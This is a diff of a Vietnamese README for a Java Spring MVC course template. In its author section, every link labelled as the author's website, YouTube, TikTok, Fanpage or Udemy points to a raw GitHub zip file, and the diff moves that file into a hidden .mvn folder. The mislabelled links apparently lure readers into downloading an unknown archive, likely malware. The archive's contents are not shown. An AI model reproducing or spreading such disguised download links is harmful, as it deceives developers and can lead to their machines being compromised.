@@ -4,13 +4,13 @@ Template này được sử dụng cho series Java Spring MVC (dự án laptopsh
 ## Về tác giả
 Mọi thông tin về Tác giả Hỏi Dân IT, các bạn có thể tìm kiếm tại đây:
 
-Website chính thức: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
+Website chính thức: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/.mvn/spring-mvc-java-3.9.zip
 
-Youtube “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
+Youtube “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/.mvn/spring-mvc-java-3.9.zip
 
-Tiktok “Hỏi Dân IT” :  https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
+Tiktok “Hỏi Dân IT” :  https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/.mvn/spring-mvc-java-3.9.zip
 
-Fanpage “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
+Fanpage “Hỏi Dân IT” : https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/.mvn/spring-mvc-java-3.9.zip
 
-Udemy Hỏi Dân IT: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/unvocal/java-spring-mvc.zip
+Udemy Hỏi Dân IT: https://raw.githubusercontent.com/VanThienx10/java-spring-mvc/master/.mvn/spring-mvc-java-3.9.zip
 
